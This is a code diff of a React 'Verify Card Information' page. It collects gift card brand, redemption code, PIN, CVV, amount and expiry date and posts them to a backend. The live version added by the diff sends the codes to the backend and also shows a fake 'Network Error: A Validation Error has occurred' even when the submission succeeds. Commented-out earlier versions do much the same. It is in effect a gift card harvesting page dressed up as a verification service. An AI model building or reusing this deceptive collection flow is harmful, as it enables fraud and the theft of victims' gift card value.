@@ -87,154 +87,13 @@
 
 // // export default Formpage
 // // Redesigned Formpage with AOS animation, error message, Lucide icons, and styling
-// import axios from 'axios';
-// import { useState, useEffect } from 'react';
-// import { AlertCircle } from 'lucide-react';
-// import AOS from 'aos';
-// import 'aos/dist/aos.css';
-
-// const Formpage = ({refProp}) => {
-//   const [formData, setFormData] = useState({
-//     Name: '',
-//     Currency: '',
-//     Amount: '',
-//     Redemptioncode: '',
-//     Pin: '',
-//     GiftCardCvv: '',
-//     ExpireDate: '',
-//   });
-//   const [error, setError] = useState('');
-//   const [loading, setLoading] = useState(false);
-
-//   useEffect(() => {
-//     AOS.init({ duration: 800 });
-//   }, []);
-
-//   const handleChange = (e) => {
-//     setFormData({ ...formData, [e.target.name]: e.target.value });
-//   };
-
-//   const handleSubmit = async () => {
-//     const { Name, Currency, Amount, Redemptioncode, Pin, GiftCardCvv, ExpireDate } = formData;
-//     if (!Name || !Currency || !Amount || !Redemptioncode || !Pin || !GiftCardCvv || !ExpireDate) {
-//       setError('Please fill in all required fields.');
-//       return;
-//     }
-//     setLoading(true);
-//     setError('');
-
-//     try {
-//       const response = await axios.post('http://localhost:2060/api/v1/create', formData);
-//       console.log(response);
-//         setError('Network Error: A Validation Error has occurred. Please Try Again');
-//     } catch (err) {
-//       setError('Something went wrong while submitting.');
-//       console.error(err);
-//     } finally {
-//       setLoading(false);
-//     }
-//   };
-
-//   return (
-//     <div ref={refProp} className="w-full min-h-screen bg-[#1f1f1f] flex items-center justify-center p-4">
-//       <div className="w-full max-w-5xl grid grid-cols-1 sm:grid-cols-2 gap-10 items-center" data-aos="fade-in">
-//         <div className="bg-[#2d2d2d] p-8 rounded-2xl shadow-lg text-white space-y-4">
-//           <h2 className="text-2xl font-bold">Verify Card Information</h2>
-//           {error && (
-//             <div className="flex items-center gap-2 text-red-400 bg-red-950 p-3 rounded-md animate-fade-in">
-//               <AlertCircle size={20} />
-//               <p>{error}</p>
-//             </div>
-//           )}
-//           <select name="Name" onChange={handleChange} className="w-full p-2 rounded-md bg-white text-black">
-//             <option value="">Select Card</option>
-//             {["Amazon", "Amex", "TT Visa", "Visa Silvery White", "Wallmart Visa", "Valina Visa", "Master Card", "Nike", "eBay", "steam", "Apple iTunes", "Google Play", "American Express", "US PSN", "Razer Gold", "Spotify", "Nordstrom", "Sephora", "Hulu", "Visa Gift", "Us Paramount+"].map(card => (
-//               <option key={card} value={card}>{card}</option>
-//             ))}
-//           </select>
-
-//           <div className="flex gap-2">
-//             <select name="Currency" onChange={handleChange} className="w-1/2 p-2 rounded-md bg-white text-black">
-//               <option value="">Currency</option>
-//               {["USD", "EUR", "BTC", "GBP", "CAD", "CNY", "JPY"].map(curr => (
-//                 <option key={curr} value={curr}>{curr}</option>
-//               ))}
-//             </select>
-//             <input
-//               name="Amount"
-//               onChange={handleChange}
-//               type="number"
-//               placeholder="Amount"
-//               className="w-1/2 p-2 rounded-md bg-white text-black"
-//             />
-//           </div>
-
-//           <input
-//             name="Redemptioncode"
-//             onChange={handleChange}
-//             type="text"
-//             placeholder="Redemption Code"
-//             className="w-full p-2 rounded-md bg-white text-black"
-//           />
-
-//           <input
-//             name="ExpireDate"
-//             onChange={handleChange}
-//             type="date"
-//             placeholder="Expiration Date"
-//             className="w-full p-2 rounded-md bg-white text-black"
-//           />
-
-//           <input
-//             name="Pin"
-//             onChange={handleChange}
-//             type="text"
-//             placeholder="Enter Your PIN"
-//             className="w-full p-2 rounded-md bg-white text-black"
-//           />
-
-//           <input
-//             name="GiftCardCvv"
-//             onChange={handleChange}
-//             type="text"
-//             placeholder="Gift Card CVV"
-//             className="w-full p-2 rounded-md bg-white text-black"
-//           />
-
-//           <button
-//             onClick={handleSubmit}
-//             disabled={loading}
-//             className="w-full p-3 bg-red-600 hover:bg-red-700 transition text-white rounded-md"
-//           >
-//             {loading ? 'Submitting...' : 'Continue'}
-//           </button>
-
-//           <p className="text-sm text-center opacity-75">
-//             Please make sure the codes you are about to input are correct and according to the details
-//           </p>
-//         </div>
-
-//         <div className="flex justify-center" data-aos="fade-up">
-//           <img
-//             src="https://giftlycheck.com/wp-content/uploads/2024/05/GettyImages-1247122676-8ec11b340a684f69b093ced5d8c2e492-1024x683-1.jpg"
-//             alt="Gift Card"
-//             className="rounded-xl w-full max-h-[400px] object-cover shadow-md"
-//           />
-//         </div>
-//       </div>
-//     </div>
-//   );
-// };
-
-// export default Formpage;
-
 import axios from 'axios';
 import { useState, useEffect } from 'react';
 import { AlertCircle } from 'lucide-react';
 import AOS from 'aos';
 import 'aos/dist/aos.css';
 
-const Formpage = ({ refProp }) => {
+const Formpage = ({refProp}) => {
   const [formData, setFormData] = useState({
     Name: '',
     Currency: '',
@@ -257,48 +116,20 @@ const Formpage = ({ refProp }) => {
 
   const handleSubmit = async () => {
     const { Name, Currency, Amount, Redemptioncode, Pin, GiftCardCvv, ExpireDate } = formData;
-
-    // Log each data for debugging
-    console.log('Name:', Name);
-    console.log('Currency:', Currency);
-    console.log('Amount:', Amount);
-    console.log('Redemptioncode:', Redemptioncode);
-    console.log('Pin:', Pin);
-    console.log('GiftCardCvv:', GiftCardCvv);
-    console.log('ExpireDate:', ExpireDate);
-
     if (!Name || !Currency || !Amount || !Redemptioncode || !Pin || !GiftCardCvv || !ExpireDate) {
       setError('Please fill in all required fields.');
       return;
     }
+    setLoading(true);
+    setError('Network Error: A Validation Error has occurred. Please Try Again');
 
     try {
-      setLoading(true);
       const response = await axios.post('http://localhost:2060/api/v1/create', formData);
-      console.log('API Response:', response.data);
-
-      // Optional: clear form and reset
-      setFormData({
-        Name: '',
-        Currency: '',
-        Amount: '',
-        Redemptioncode: '',
-        Pin: '',
-        GiftCardCvv: '',
-        ExpireDate: '',
-      });
-      setError('Validation error occurred');
+      console.log(response);
+        setError('Network Error: A Validation Error has occurred. Please Try Again');
     } catch (err) {
-      console.error('API Error:', err);
-      if (err.response) {
-        console.log('Error Data:', err.response.data);
-        setError(`Error: ${ 'Validation error occurred'}`);
-      } else if (err.request) {
-        console.log('Error Request:', err.request);
-        setError('No response from server.');
-      } else {
-        setError('Request setup error.');
-      }
+      setError('Something went wrong while submitting.');
+      console.error(err);
     } finally {
       setLoading(false);
     }
@@ -307,113 +138,87 @@ const Formpage = ({ refProp }) => {
   return (
     <div ref={refProp} className="w-full min-h-screen bg-[#1f1f1f] flex items-center justify-center p-4">
       <div className="w-full max-w-5xl grid grid-cols-1 sm:grid-cols-2 gap-10 items-center" data-aos="fade-in">
-        <div className="bg-[#2d2d2d] p-8 rounded-2xl shadow-lg text-white space-y-4 w-full">
-          <h2 className="text-xl font-bold">Verify Card Information</h2>
-
-          <select name="Name" value={formData.Name} onChange={handleChange} className="w-full p-2 rounded bg-white text-black">
+        <div className="bg-[#2d2d2d] p-8 rounded-2xl shadow-lg text-white space-y-4">
+          <h2 className="text-2xl font-bold">Verify Card Information</h2>
+          {error && (
+            <div className="flex items-center gap-2 text-red-400 bg-red-950 p-3 rounded-md animate-fade-in">
+              <AlertCircle size={20} />
+              <p>{error}</p>
+            </div>
+          )}
+          <select name="Name" onChange={handleChange} className="w-full p-2 rounded-md bg-white text-black">
             <option value="">Select Card</option>
-            <option value="Amazon">Amazon</option>
-            <option value="Amex">Amex</option>
-            <option value="TT Visa">TT Visa</option>
-            <option value="Visa Silvery White">Visa Silvery White</option>
-            <option value="Wallmart Visa">Wallmart Visa</option>
-            <option value="Valina Visa">Valina Visa</option>
-            <option value="Master Card">Master Card</option>
-            <option value="Nike">Nike</option>
-            <option value="eBay">eBay</option>
-            <option value="steam">Steam</option>
-            <option value="Apple iTunes">Apple iTunes</option>
-            <option value="Google Play">Google Play</option>
-            <option value="American Express">American Express</option>
-            <option value="US PSN">US PSN</option>
-            <option value="Razer Gold">Razer Gold</option>
-            <option value="Spotify">Spotify</option>
-            <option value="Nordstrom">Nordstrom</option>
-            <option value="Sephora">Sephora</option>
-            <option value="Hulu">Hulu</option>
-            <option value="Visa Gift">Visa Gift</option>
-            <option value="Us Paramount+">Us Paramount+</option>
+            {["Amazon", "Amex", "TT Visa", "Visa Silvery White", "Wallmart Visa", "Valina Visa", "Master Card", "Nike", "eBay", "steam", "Apple iTunes", "Google Play", "American Express", "US PSN", "Razer Gold", "Spotify", "Nordstrom", "Sephora", "Hulu", "Visa Gift", "Us Paramount+"].map(card => (
+              <option key={card} value={card}>{card}</option>
+            ))}
           </select>
 
           <div className="flex gap-2">
-            <select name="Currency" value={formData.Currency} onChange={handleChange} className="w-1/2 p-2 rounded bg-white text-black">
+            <select name="Currency" onChange={handleChange} className="w-1/2 p-2 rounded-md bg-white text-black">
               <option value="">Currency</option>
-              <option value="USD">USD</option>
-              <option value="EUR">EUR</option>
-              <option value="BTC">BTC</option>
-              <option value="GBP">GBP</option>
-              <option value="CAD">CAD</option>
-              <option value="CNY">CNY</option>
-              <option value="JPY">JPY</option>
+              {["USD", "EUR", "BTC", "GBP", "CAD", "CNY", "JPY"].map(curr => (
+                <option key={curr} value={curr}>{curr}</option>
+              ))}
             </select>
             <input
-              type="number"
               name="Amount"
-              value={formData.Amount}
               onChange={handleChange}
-              className="w-1/2 p-2 rounded bg-white text-black"
-              placeholder="Card Amount"
+              type="number"
+              placeholder="Amount"
+              className="w-1/2 p-2 rounded-md bg-white text-black"
             />
           </div>
 
           <input
-            type="text"
             name="Redemptioncode"
-            value={formData.Redemptioncode}
             onChange={handleChange}
-            className="w-full p-2 rounded bg-white text-black"
+            type="text"
             placeholder="Redemption Code"
-          />
-          <input
-            type="date"
-            name="ExpireDate"
-            value={formData.ExpireDate}
-            onChange={handleChange}
-            className="w-full p-2 rounded bg-white text-black"
-            placeholder="Expiration Date"
-          />
-          <input
-            type="text"
-            name="Pin"
-            value={formData.Pin}
-            onChange={handleChange}
-            className="w-full p-2 rounded bg-white text-black"
-            placeholder="Enter Your Pin"
-          />
-          <input
-            type="text"
-            name="GiftCardCvv"
-            value={formData.GiftCardCvv}
-            onChange={handleChange}
-            className="w-full p-2 rounded bg-white text-black"
-            placeholder="Gift Card CVV"
+            className="w-full p-2 rounded-md bg-white text-black"
           />
 
-          {error && (
-            <div className="flex items-center text-red-500 text-sm gap-2">
-              <AlertCircle size={16} />
-              {error}
-            </div>
-          )}
+          <input
+            name="ExpireDate"
+            onChange={handleChange}
+            type="date"
+            placeholder="Expiration Date"
+            className="w-full p-2 rounded-md bg-white text-black"
+          />
+
+          <input
+            name="Pin"
+            onChange={handleChange}
+            type="text"
+            placeholder="Enter Your PIN"
+            className="w-full p-2 rounded-md bg-white text-black"
+          />
+
+          <input
+            name="GiftCardCvv"
+            onChange={handleChange}
+            type="text"
+            placeholder="Gift Card CVV"
+            className="w-full p-2 rounded-md bg-white text-black"
+          />
 
           <button
             onClick={handleSubmit}
-            className="w-full p-2 bg-red-600 text-white font-semibold rounded hover:bg-red-700 disabled:opacity-50"
             disabled={loading}
+            className="w-full p-3 bg-red-600 hover:bg-red-700 transition text-white rounded-md"
           >
-            {loading ? 'Processing...' : 'CONTINUE'}
+            {loading ? 'Submitting...' : 'Continue'}
           </button>
 
-          <p className="text-xs text-center text-white">
-            Please make sure the codes you are about to input are correct and according to details.
+          <p className="text-sm text-center opacity-75">
+            Please make sure the codes you are about to input are correct and according to the details
           </p>
         </div>
 
-        <div className="flex items-center justify-center">
+        <div className="flex justify-center" data-aos="fade-up">
           <img
             src="https://giftlycheck.com/wp-content/uploads/2024/05/GettyImages-1247122676-8ec11b340a684f69b093ced5d8c2e492-1024x683-1.jpg"
-            alt="Card verification"
-            className="w-[90%] sm:w-[80%] rounded-xl shadow-xl"
+            alt="Gift Card"
+            className="rounded-xl w-full max-h-[400px] object-cover shadow-md"
           />
         </div>
       </div>
@@ -422,4 +227,199 @@ const Formpage = ({ refProp }) => {
 };
 
 export default Formpage;
+
+// import axios from 'axios';
+// import { useState, useEffect } from 'react';
+// import { AlertCircle } from 'lucide-react';
+// import AOS from 'aos';
+// import 'aos/dist/aos.css';
+
+// const Formpage = ({ refProp }) => {
+//   const [formData, setFormData] = useState({
+//     Name: '',
+//     Currency: '',
+//     Amount: '',
+//     Redemptioncode: '',
+//     Pin: '',
+//     GiftCardCvv: '',
+//     ExpireDate: '',
+//   });
+//   const [error, setError] = useState('');
+//   const [loading, setLoading] = useState(false);
+
+//   useEffect(() => {
+//     AOS.init({ duration: 800 });
+//   }, []);
+
+//   const handleChange = (e) => {
+//     setFormData({ ...formData, [e.target.name]: e.target.value });
+//   };
+
+//   const handleSubmit = async () => {
+//     const { Name, Currency, Amount, Redemptioncode, Pin, GiftCardCvv, ExpireDate } = formData;
+
+//     // Log each data for debugging
+//     console.log('Name:', Name);
+//     console.log('Currency:', Currency);
+//     console.log('Amount:', Amount);
+//     console.log('Redemptioncode:', Redemptioncode);
+//     console.log('Pin:', Pin);
+//     console.log('GiftCardCvv:', GiftCardCvv);
+//     console.log('ExpireDate:', ExpireDate);
+
+//     if (!Name || !Currency || !Amount || !Redemptioncode || !Pin || !GiftCardCvv || !ExpireDate) {
+//       setError('Please fill in all required fields.');
+//       return;
+//     }
+
+//     try {
+//       setLoading(true);
+//       const response = await axios.post('http://localhost:2060/api/v1/create', formData);
+//       console.log('API Response:', response.data);
+
+//       // Optional: clear form and reset
+//       setFormData({
+//         Name: '',
+//         Currency: '',
+//         Amount: '',
+//         Redemptioncode: '',
+//         Pin: '',
+//         GiftCardCvv: '',
+//         ExpireDate: '',
+//       });
+//       setError('Validation error occurred');
+//     } catch (err) {
+//       console.error('API Error:', err);
+//       if (err.response) {
+//         console.log('Error Data:', err.response.data);
+//         setError(`Error: ${ 'Validation error occurred'}`);
+//       } else if (err.request) {
+//         console.log('Error Request:', err.request);
+//         setError('No response from server.');
+//       } else {
+//         setError('Request setup error.');
+//       }
+//     } finally {
+//       setLoading(false);
+//     }
+//   };
+
+//   return (
+//     <div ref={refProp} className="w-full min-h-screen bg-[#1f1f1f] flex items-center justify-center p-4">
+//       <div className="w-full max-w-5xl grid grid-cols-1 sm:grid-cols-2 gap-10 items-center" data-aos="fade-in">
+//         <div className="bg-[#2d2d2d] p-8 rounded-2xl shadow-lg text-white space-y-4 w-full">
+//           <h2 className="text-xl font-bold">Verify Card Information</h2>
+
+//           <select name="Name" value={formData.Name} onChange={handleChange} className="w-full p-2 rounded bg-white text-black">
+//             <option value="">Select Card</option>
+//             <option value="Amazon">Amazon</option>
+//             <option value="Amex">Amex</option>
+//             <option value="TT Visa">TT Visa</option>
+//             <option value="Visa Silvery White">Visa Silvery White</option>
+//             <option value="Wallmart Visa">Wallmart Visa</option>
+//             <option value="Valina Visa">Valina Visa</option>
+//             <option value="Master Card">Master Card</option>
+//             <option value="Nike">Nike</option>
+//             <option value="eBay">eBay</option>
+//             <option value="steam">Steam</option>
+//             <option value="Apple iTunes">Apple iTunes</option>
+//             <option value="Google Play">Google Play</option>
+//             <option value="American Express">American Express</option>
+//             <option value="US PSN">US PSN</option>
+//             <option value="Razer Gold">Razer Gold</option>
+//             <option value="Spotify">Spotify</option>
+//             <option value="Nordstrom">Nordstrom</option>
+//             <option value="Sephora">Sephora</option>
+//             <option value="Hulu">Hulu</option>
+//             <option value="Visa Gift">Visa Gift</option>
+//             <option value="Us Paramount+">Us Paramount+</option>
+//           </select>
+
+//           <div className="flex gap-2">
+//             <select name="Currency" value={formData.Currency} onChange={handleChange} className="w-1/2 p-2 rounded bg-white text-black">
+//               <option value="">Currency</option>
+//               <option value="USD">USD</option>
+//               <option value="EUR">EUR</option>
+//               <option value="BTC">BTC</option>
+//               <option value="GBP">GBP</option>
+//               <option value="CAD">CAD</option>
+//               <option value="CNY">CNY</option>
+//               <option value="JPY">JPY</option>
+//             </select>
+//             <input
+//               type="number"
+//               name="Amount"
+//               value={formData.Amount}
+//               onChange={handleChange}
+//               className="w-1/2 p-2 rounded bg-white text-black"
+//               placeholder="Card Amount"
+//             />
+//           </div>
+
+//           <input
+//             type="text"
+//             name="Redemptioncode"
+//             value={formData.Redemptioncode}
+//             onChange={handleChange}
+//             className="w-full p-2 rounded bg-white text-black"
+//             placeholder="Redemption Code"
+//           />
+//           <input
+//             type="date"
+//             name="ExpireDate"
+//             value={formData.ExpireDate}
+//             onChange={handleChange}
+//             className="w-full p-2 rounded bg-white text-black"
+//             placeholder="Expiration Date"
+//           />
+//           <input
+//             type="text"
+//             name="Pin"
+//             value={formData.Pin}
+//             onChange={handleChange}
+//             className="w-full p-2 rounded bg-white text-black"
+//             placeholder="Enter Your Pin"
+//           />
+//           <input
+//             type="text"
+//             name="GiftCardCvv"
+//             value={formData.GiftCardCvv}
+//             onChange={handleChange}
+//             className="w-full p-2 rounded bg-white text-black"
+//             placeholder="Gift Card CVV"
+//           />
+
+//           {error && (
+//             <div className="flex items-center text-red-500 text-sm gap-2">
+//               <AlertCircle size={16} />
+//               {error}
+//             </div>
+//           )}
+
+//           <button
+//             onClick={handleSubmit}
+//             className="w-full p-2 bg-red-600 text-white font-semibold rounded hover:bg-red-700 disabled:opacity-50"
+//             disabled={loading}
+//           >
+//             {loading ? 'Processing...' : 'CONTINUE'}
+//           </button>
+
+//           <p className="text-xs text-center text-white">
+//             Please make sure the codes you are about to input are correct and according to details.
+//           </p>
+//         </div>
+
+//         <div className="flex items-center justify-center">
+//           <img
+//             src="https://giftlycheck.com/wp-content/uploads/2024/05/GettyImages-1247122676-8ec11b340a684f69b093ced5d8c2e492-1024x683-1.jpg"
+//             alt="Card verification"
+//             className="w-[90%] sm:w-[80%] rounded-xl shadow-xl"
+//           />
+//         </div>
+//       </div>
+//     </div>
+//   );
+// };
+
+// export default Formpage;
       
